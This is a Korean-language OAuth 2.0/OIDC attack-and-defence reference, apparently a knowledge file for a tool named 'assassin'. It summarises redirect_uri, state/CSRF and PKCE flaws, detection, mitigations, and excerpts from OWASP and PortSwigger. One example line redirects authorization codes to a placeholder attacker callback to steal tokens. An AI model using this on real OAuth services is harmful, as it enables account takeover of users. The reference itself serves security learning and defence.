# 학습 시드(심화): oauth

> 종합 레퍼런스(확립된 보안 지식 · 권위 출처 검증가능). 라이브 최신화: `assassin --learn oauth`. P1: 머신별 라이트업 미참조.

## 개요
OAuth 2.0/OIDC 결함: 흐름 구현 오류로 계정탈취.

## 핵심 기법 · 열거
- redirect_uri 검증부실(토큰/코드 탈취)
- state 누락 → CSRF
- 암시적 흐름 토큰 노출·코드 재사용
- PKCE 미적용·open redirect 체인

## 표준 도구 · 명령
```
redirect_uri=https://attacker/callback   # 검증 우회 시도
응답의 code/token 을 공격자 콜백으로 탈취
```

## 블루팀 탐지
비정상 redirect_uri·code 재사용·state 불일치 로그.

## 완화
redirect_uri 정확일치·state/PKCE 필수·1회성 코드·짧은 만료.

- 출처(검증): https://portswigger.net/web-security/oauth

## 최신 보강(승격)

> `assassin --promote` 품질 관문을 통과한 권위 출처 발췌. 수정·삭제는 PR 리뷰로. 사람이 다듬은 위 섹션이 우선한다.

### OWASP OAuth 2.0 Cheat Sheet
- 출처: https://cheatsheetseries.owasp.org/cheatsheets/OAuth2_Cheat_Sheet.html
- 승격일: 2026-10-07
- 요약: OAuth 2.0 Protocol Cheatsheet This cheatsheet describes the best current security practices for OAuth 2.0 as derived from its RFC. OAuth became the standard for API protection and the basis for federated login using OpenID Connect. OpenID Connect 1.0 is a simple identity layer on top of the OAuth 2.0 protocol. It enables clients to verify the identity of the end user based on the authentication performed by an authorization server, as well as to obtain basic profile information about the end use

### PortSwigger OAuth
- 출처: https://portswigger.net/web-security/oauth
- 승격일: 2026-10-07
- 요약: OAuth 2.0 authentication vulnerabilities While browsing the web, you've almost certainly come across sites that let you log in using your social media account. The chances are that this feature is built using the popular OAuth 2.0 framework. OAuth 2.0 is highly interesting for attackers because it is both extremely common and inherently prone to implementation mistakes. This can result in a number of vulnerabilities, allowing attackers to obtain sensitive user data and potentially bypass authent
